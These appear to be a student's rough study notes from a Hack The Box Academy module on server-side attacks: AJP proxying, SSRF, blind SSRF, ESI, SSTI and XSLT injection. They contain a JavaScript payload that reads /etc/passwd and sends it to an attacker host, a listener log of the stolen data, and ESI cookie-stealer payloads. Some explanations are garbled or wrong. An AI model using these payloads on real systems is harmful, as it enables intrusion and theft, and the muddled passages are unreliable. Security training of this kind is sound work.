  

from its name it targets the Main-Backend server .

  

# Types of Server-side Attacks :

## Abusing intermediary applications

accessing the internal applications that are not acessible from our netwrok by leraging specific exposed binary protocols .

## Server-side Request Forgery

Making the hosting application server issue requests to arbitrary external domains or internal resorcues in an attemt to identify sensitive data

## Server-side includes Injection (ssi )

injecting a payload so that ill0intended srver-side include directives are pared to achieve remote code excution or leak [sens](http://sens.data)itive data . this vulnerability occurs when poorly validated user input manages to become part of a response that is parsed for server-side include directives .

  

## Edge-side includes injection ( esi)

is an xml-based markup language used to tackle perforamnce issues by temporarily storing dynamic webcontent that the regular web caching protocols do not save . edge side include injection occurs when an attacker manages to reflect ill-intended ESI tags in the HTTP Responses the root cause of this vulnerability is that http surrogates cannot validate the esi tag origin they will gladly parse and evaluate legitimate ESI tags by the upstream server and maliciuose ESI tags supplied by an attacker

  

## server side template injection (SSTI )

template engines facilitate dynamic data presentation through web pages or emails . leveraging template engines that insecurely ix user input with a iven template .

  

## Extensible stylesheet language transformations server-side injection ( xslt) :

XSLT is an xml -based language usually used when transforming xml documents into html another xml document or pdf . extensible stylesheet language transormations server-side injection can occur when arbitrary xslt file upload is possible or when an application generates the xsl tranforation’s xml document dynamically using unvalidatedd input from the user document dynaically using unvalidated input from the usr .

  

# Abusing intermediary Applications

## AJP proxy

- AJP is ( Apache Jserv prtocol ) .
- according to apache :AJP or JK is a wire protocol .
- AJP or JK is an optimized version of the HTTP protocol to allow a standalone web server such as apache to talk to tomcat.
    
    ---
    

## Nginx Reverse Proxy & AJP

so Nginx is a web server software that can also be used as a reverse proxy . so ( server software for WA , and also can be used as a reverse proxy …( what is reverse proxy ) ? → the reverse proxy is a proxy that controls the direction of the request to server path ( when some client server do a reqeust it gets passed to the reverse server then it decides which server _backend server that should recieve this request .

- we are going to exploit an open AJP port to gain access to a ‘hidden’ Tomcat manager page and we will use Nginx as a reverse proxy

## Apache Reverse Proxy & AJP

- Apache has the ajp model precompiled for us so we are not going to compile it as we did with the nginx .
- Luckily, Apache has the AJP module precompiled for us. We will need  
    to install it, though, as it doesn't come in default installations.  
    Configuring the AJP-Proxy in our Apache server can be done as follows:
    
    - Install the libapache2-mod-jk package
    - Enable the module
    - Create the configuration file pointing to the target AJP-Proxy port
- The required commands and configuration files are the following:
    
    ```
    KareemAlsadeq@htb[/htb]$ sudo apt install libapache2-mod-jkKareemAlsadeq@htb[/htb]$ sudo a2enmod proxy_ajpKareemAlsadeq@htb[/htb]$ sudo a2enmod proxy_httpKareemAlsadeq@htb[/htb]$ export TARGET="<TARGET_IP>"KareemAlsadeq@htb[/htb]$ echo -n """<Proxy *>
    Order allow,deny
    Allow from all
    </Proxy>
    ProxyPass / ajp://$TARGET:8009/
    ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.confKareemAlsadeq@htb[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.confKareemAlsadeq@htb[/htb]$ sudo systemctl start apache2
    ```
    

# SSRF Server-side Request Forgery

## SSRF overview:

- ssrf : server side request forgery attacks
- function : allows us to abuse server functionality to perform internal or external resource requests on behalf of the server .
    - in another words we make a request that is not really from the admin but the server think it is from admin and then answer by a response that contains the resources we want to view secret things .
- and to do server side request forgery we usually need :
    - modify the url used by the main target to read data or submit data .
- **Note:** Always keep in mind that web application fuzzing should be  
    part of any penetration testing or bug bounty hunting activity. That  
    being said, fuzzing should not be limited to user input fields only.  
    Extend fuzzing to parts of the HTTP request as well, such as the  
    User-Agent.

## SSRF Exploitation example :

- our goal is to get remote code excution on the target …How ? .. via utilizing multiple SSRF vulnerabilities .
- our steps are :
    
    - **Nmap - Discovering Open Ports:**
        
        ```
        nmap -sT -T5 --min-rate=10000 -p-<targetIP>
        ```
        
        PORT STATE SERVICE  
        22/tcp open ssh  
        80/tcp open http  
        8080/tcp open http-proxy
        
          
        
    
    - if there is any redirection happening in when we use curl we can then use -L to follow the redirect and curl it also
    - the second step we did was to see the response headers that are gained via curl and follow the redirect via -L with curl also .
    - as we saw we saw The spawned target is `ubuntu-web.lalaguna.local`, and `internal.app.local` is an application on the internal network (inaccessible from our current position). and we now want to see if the q parameter is vulnerable or not so we will do an out of band test which is via a listener and then

# SSI Server-side (include) injection

  

# Blind SSRF

Server-Side Request Forgery vulnerabilities can be "blind." In these  
cases, even though the request is processed, we can't see the backend  
server's response. For this reason, blind SSRF vulnerabilities are more  
difficult to detect and exploit.

We can detect blind SSRF vulnerabilities via out-of-band techniques,  
making the server issue a request to an external service under our  
control. To detect if a backend service is processing our requests, we  
can either use a server with a public IP address that we own or services  
such as:

- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) (Part of Burp Suite professional. Not Available in the community edition)
- http://pingb.in

Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.

## Blind SSRF exploitation

- the web application recieves a HTML file and returns a PDF document.
- simply it is a convertor from html to pdf and this is our target
- if we intercept the request we will find that the web application returns the same response for any html file sent nomatter what is its info or data or anything we cannot observe any response related to the processing of the submitted html file on the fron tend . so we will go to out of band testing .
- [![](https://academy.hackthebox.com/storage/modules/145/img/response_blind1_.png)](https://academy.hackthebox.com/storage/modules/145/img/response_blind1_.png)
    
    Let us create an HTML file containing a link to a service under our  
    control to test if the application is vulnerable to a blind SSRF  
    vulnerability. This service can be a web server hosted in a machine we  
    own, Burp Collaborator, a ==Pingb.in== URL etc. Please note that the  
    protocols we can use when utilizing out-of-band techniques include HTTP,  
    DNS, FTP, etc.
    
      
    
- we send the html file that will be converted as a maliciouse file that contains <img src=”htt://ourIP:listeningPort/x?=viaimgtag”> and by that we will recieve a http request in our listener ( we are acting as if we are a server in our own and make the html file asks us for connection ) and the one who do that is the targeted website he asks us for the connection via our maliciouse html file .
- we used netcat for listening for simplisity reasons but we could also use python http.server 8080 for example to listen but we will keep it with nc -nlvp 9090
- <img src=http://ourIPpublicONE:9090/x?=viaimgtag”>
- by inspecting the request sent to use from the target we notice wkhtmltopdf in the user-agent
- which is a website that implement a html to pdf service for other websites and apparently the target use it for the functionality and we found in the home of wkhtmltopdf an alert msg says “dont use wkhtmltopdf with any untrusted html - be user to sanitize any user-supplied html/jss; otherwise it can lead to the complete takeover of the server it is running on ! please read the project status for the gory details.
- great this means we can execute js in wkhtmltopdf !
- lets leveerage this functionality to read a local file by creating the following html file :

```
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

we implemented a js code in the html code we are using .

we are using two xml http request objects , one for reading the local file and the other one to send it to our server and we use the btoa function to encode the sent data to base64.

lets start an http server , submit the new html file , wait for the response , and decode its contents once the html file is processed , as follows .

Netcat listenr:

  

```
KareemAlsadeq@htb[/htb]$ sudo nc -nlvp 9090Listening on 0.0.0.0 9090
GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1
Origin: file://
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.14.221:9090
```

  

- in our terminal if we opened it and typed echo “” | base64 -d we will get the decoded data
- and yes we were able to read [file:///etc/passwd](https://www.notion.sofile:///etc/passwd)
    
    ![[Untitled 4.png|Untitled 4.png]]
    
    - in the previous section , we exploited an internal application trough ssrf and exectued remote commands on the target
    - we will use the following reverse shell payload ( it si pretty easy to identify that python is installed once you achieve remote code execution l

  

  

# ESI Edge-side (include) injection

- ESI : edge side injection is xml markup language used to tackle performance .
- edge side include injection occurs when an attacker do : ) >>> when the attacker wants and manages to reflect some maliciouse ESI tags in the response
- esi tags are used to instruct an HTTP surrogate ( reverse-proxy) caching server… etc . to fetch additional information regarding a web page .
- proxy is an intermediate service that is used to send the request to the server from the user and the response from the server to the user .
- SO Proxy is just a service that is used to transfer the request and response between the two ( user -server ) .
- but , what is the reverse proxy we already knew the forward proxy
- mainly the forward is the request sended to the server
- and the reverse proxy : is the wayback proxy of the response
- so we were mainly talking about ESI : which we said is ESI is mainly about dynamic content while cach is static
- **ESI Injection Vulnerabilities:**
    - An attacker might exploit misconfigurations or lack of input sanitization to inject malicious ESI tags into web content. These injected tags could lead to various attacks, like making the caching server fetch content from unintended sources, potentially leaking sensitive information or even reaching internal systems behind firewalls.
- **Blind ESI Attacks:**
    - Even if an application doesn't explicitly show signs of processing ESI tags, a pentester might try introducing them to determine if any intermediary proxy or cache mechanism is parsing and executing the tags, thus revealing potential ESI vulnerabilities.
- **Information Disclosure:**
    - Improperly configured ESI can lead to information leaks. For instance, if error messages from one user's actions are cached and then displayed to another user, it can leak information that might be useful for an attacker.
- Bypassing Security Mechanisms:
    
    ```
    	ESI might be exploited to bypass certain security restrictions. For example, an attacker could use ESI tags to force the server to make requests to other internal resources, potentially bypassing IP-based access controls or firewalls.
    
    ```
    
- **Denial of Service (DoS):**
    - Attackers could potentially exploit ESI to launch DoS attacks, causing the server to make excessive or resource-intensive requests.
- **Tools and Testing:**
    - As a pentester becomes familiar with ESI vulnerabilities, they might integrate specific ESI-related checks and tools into their testing methodologies.
- **Recommendations and Mitigations:**
    - Once vulnerabilities are identified, a pentester would need to provide recommendations on how to mitigate these risks, which might include proper input sanitization, strict ESI configurations, and ensuring that sensitive operations aren't processable through ESI.
- Understanding the intricacies of ESI is essential for pentesters, especially when targeting web applications that utilize caching mechanisms and content delivery networks. Recognizing and exploiting ESI-related vulnerabilities can be a significant aspect of web application penetration testing.
- Payloads for ESI
    
    `// Basic detection <esi: include src=http://<PENTESTER IP>> // XSS Exploitation Example <esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>> // Cookie Stealer (bypass httpOnly flag) <esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)> // Introduce private local files (Not LFI per se) <esi:include src="supersecret.txt"> // Valid for Akamai, sends debug information in the response <esi:debug/>`
    
      
    
    .QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ.
    
    so in some cases we can achieve remote code exectuion when the application processing ESI directives supports XSLT , a dynamic language used to transform xml files . in that case , we can pass dca=xslt to the payload . the xml file selected will be processed with the possiblity of performing xml external entity injection attacks (xxe) with some limitations
    
    1. **Detection**:
        - **Response Headers**: Inspect HTTP response headers for indicators like `Surrogate-Control: content="ESI/1.0"`. This can be an initial sign of ESI usage.
        - **Blind ESI Testing**: Introduce ESI tags into HTTP requests (such as in the URL, POST data, or cookies). If the server's response behaves differently or processes the ESI tags, it might indicate ESI parsing.
        - **Error Responses**: Some misconfigurations may result in error messages when trying to process injected ESI tags. These errors can disclose information about the infrastructure or confirm ESI processing.
    2. **Exploitation**:
        - The general idea (without getting into specifics) is to inject malicious ESI tags that cause the server or caching mechanism to fetch content from unintended sources or execute unintended actions. This could be used for information disclosure, internal network probing, or other malicious actions.
    3. **Mitigation**:
        - **Input Validation**: Always validate and sanitize user inputs. By removing or encoding special characters, you can prevent ESI tags from being processed.
        - **Disable Unnecessary ESI Processing**: If ESI isn't needed, disable it. If it is, restrict it to specific pages or portions of your application.
        - **Use Web Application Firewalls (WAFs)**: Many WAFs can detect and block ESI injection attempts.
        - **Strict ESI Configuration**: Limit the sources from which dynamic content can be fetched and the actions that can be executed via ESI tags.
        - **Regular Security Audits**: Regularly audit and review your application and infrastructure to ensure there are no misconfigurations or vulnerabilities.
            
            [GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)  
            has created a table to help us understand possible attacks that we can  
            try against different ESI-capable software, depending on the  
            functionality supported. Let us provide some explanations regarding the  
            column names of the below table first:
            
            - Includes: Supports the `<esi:includes>` directive
            - Vars: Supports the `<esi:vars>` directive. Useful for bypassing XSS Filters
            - Cookie: Document cookies are accessible to the ESI engine
            - Upstream Headers Required: Surrogate applications will not process  
                ESI statements unless the upstream application provides the headers
            - Host Allowlist: In this case, ESI includes are only possible from  
                allowed server hosts, making SSRF, for example, only possible against  
                those hosts
            
            |   |   |   |   |   |   |
            |---|---|---|---|---|---|
            |**Software**|**Includes**|**Vars**|**Cookies**|**Upstream Headers Required**|**Host Whitelist**|
            |Squid3|Yes|Yes|Yes|Yes|No|
            |Varnish Cache|Yes|No|No|Yes|Yes|
            |Fastly|Yes|No|No|No|Yes|
            |Akamai ESI Test Server (ETS)|Yes|Yes|Yes|No|No|
            |NodeJS esi|Yes|Yes|Yes|No|No|
            |NodeJS nodesi|Yes|No|No|No|Optional|
            

# Server-side (template) Injections

- to do template injection in template engines of wa we need to first knew what is template engines ? ? ⇒ ans : we have our template document that contains data we want to insert in the template engine .
- **Template engines are tools that allow you to insert data and logic into HTML templates**, while frameworks are libraries or platforms that provide a complete structure and functionality for web development.
- template engines read tokenized strings from template documents and produce rendered strings with actual values in the output document . those templates are commonly used as intermediary format by web developers to create dynamic website contents so
- SO , mainly the template engines do contain both ( data , logic ) and then they are displaying those data in the form of html rendered objects that are going to be used as ( intermediary phase for those object ) to be tranfered into the parts that are dynamic in the page .
- now lets talk about SSTI server side template injections :) is about injecting maliciouse directives for the template to take there data from instead of their own documents getting use of those template engines that are not doing the sanizisation right they will mix ( user input and maliciouse template )
- and it is very pointed vulnerability as if it takes any arguments from us it will not sanitize it mostly so we will be able to code execution on it on the server .
- # Introduction to Template Engines
    
    ---
    
    Template engines read tokenized strings from template documents and  
    produce rendered strings with actual values in the output document.  
    Templates are commonly used as an intermediary format by web developers  
    to create dynamic website content. Server-Side Template Injection (`SSTI`)  
    is essentially injecting malicious template directives inside a  
    template, leveraging Template Engines that insecurely mix user input  
    with a given template.
    
    Below you will find some applications that you can run locally to  
    better understand templates. If you are unable to do so, do not worry.  
    The following sections feature exercises with various applications  
    utilizing templates.
    
    Let us now consider the following documents:
    
    ### app.py
    
    Code: python
    
    ```
    #/usr/bin/python3
    from flask import *
    
    app = Flask(__name__, template_folder="./")
    
    @app.route("/")
    def index():
    	title = "Index Page"
    	content = "Some content"
    	return render_template("index.html", title=title, content=content)
    
    if __name__ == "__main__":
    	app.run(host="127.0.0.1", port=5000)
    ```
    
    ### index.html
    
    Code: html
    
    ```
    <!DOCTYPE html>
    <html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Document</title></head><body><h1>{{title}}</h1><p>{{content}}</p></body></html>
    ```
    
    When we visit the website, we will receive an HTML page containing the values of the `title` and `content`  
    variables evaluated inside the double brackets on the template page.  
    Pretty straightforward, and as we can see, the user does not have any  
    control over the variables. What happens when user input enters a  
    template without any validation, though?
    
    ### app.py
    
    Code: python
    
    ```
    #/usr/bin/python3
    from flask import *
    
    app = Flask(__name__, template_folder="./")
    
    @app.route("/")
    def index():
    	title = "Index Page"
    	content = "Some content"
    	return render_template("index.html", title=title, content=content)
    
    @app.route("/hello", methods=['GET'])
    def hello():
    	name = request.args.get("name")
    	if name == None:
    		return redirect(f'{url_for("hello")}?name=guest')
    	htmldoc = f"""
    	<html>
    	<body>
    	<h1>Hello</h1>
    	<a>Nice to see you {name}</a>
    	</body>
    	</html>
    	"""return render_template_string(htmldoc)
    
    if __name__ == "__main__":
    	app.run(host="127.0.0.1", port=5000)
    ```
    
    In this case, we can inject a template expression directly, and the  
    server will evaluate it. This is a security issue that could lead to  
    remote code execution on the target application, as we will see in the  
    following sections.
    
    ### cURL - Interacting with the Target
    
    cURL - Interacting with the Target
    
    ```
    KareemAlsadeq@htb[/htb]$ curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 79
    Server: Werkzeug/2.0.2 Python/3.9.7
    Date: Mon, 25 Oct 2021 00:12:40 GMT
    
    
    	<html>
    	<body>
    	<h1>Hello</h1>
    	<a>Nice to see you 49</a> # <-- Expresion evaluated
    	</body>
    	</html>
    ```
    
    [  
    epinna  
    ](https://github.com/epinna)  
    /  
    [**tplmap**](https://github.com/epinna/tplmap)Public
    
    Server-Side Template Injection and Code Injection Detection and Exploitation Tool
    
    and usually to knew if there is the vulenrability of SSTI (server side template injection) we simply use
    
    # SSTI Identification
    
    ---
    
    We can detect SSTI vulnerabilities by injecting different tags in the  
    inputs we control to see if they are evaluated in the response. We  
    don't necessarily need to see the injected data reflected in the  
    response we receive. Sometimes it is just evaluated on different pages  
    (blind).
    
    The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:
    
    Code: html
    
    ```
    {7*7}
    ${7*7}
    #{7*7}
    %{7*7}
    {{7*7}}
    ...
    ```
    
    We will look for "49" in the response when injecting these payloads to identify that server-side evaluation occurred.
    
    The most difficult way to identify SSTI is to fuzz the template by  
    injecting combinations of special characters used in template  
    expressions. These characters include `${{<%[%'"}}%\`. If  
    an exception is caused, this means that we have some control over what  
    the server interprets in terms of template expressions.
    
    We can use tools such as [Tplmap](https://github.com/epinna/tplmap)  
    or J2EE Scan (Burp Pro) to automatically test for SSTI vulnerabilities  
    or create a payload list to use with Burp Intruder or ZAP.
    
    The diagram below from [PortsSwigger](https://portswigger.net/research/server-side-template-injection) can help us identify if we are dealing with an SSTI vulnerability and also identify the underlying template engine.
    
    [![](https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png)](https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png)
    
    In addition to the above diagram, we can try the following approaches to recognize the technology we are dealing with:
    
    - Check verbose errors for technology names. Sometimes just copying  
        the error in Google search can provide us with a straight answer  
        regarding the underlying technology used
    - Check for extensions. For example, .jsp extensions are associated  
        with Java. When dealing with Java, we may be facing an expression  
        language/OGNL injection vulnerability instead of traditional SSTI
    - Send expressions with unclosed curly brackets to see if verbose  
        errors are generated. Do not try this approach on production systems, as you may crash the webserver.
    
      
    

- example for the exploitation process
    
      
    

# Extensible stylesheet Language Transformations Server-side injections

- what is XSLT that we are aiming ot attack ? what does XSLT mean ? …. ans …: XSLT is an xml based language usually when transforming xml documents into html , another xml document , or pdf . extensible , or pdf extensible stgyulesheet language transformations server-side injection can occur when arbitrary xslt file upload is possible or when an application .

  

[[video info]]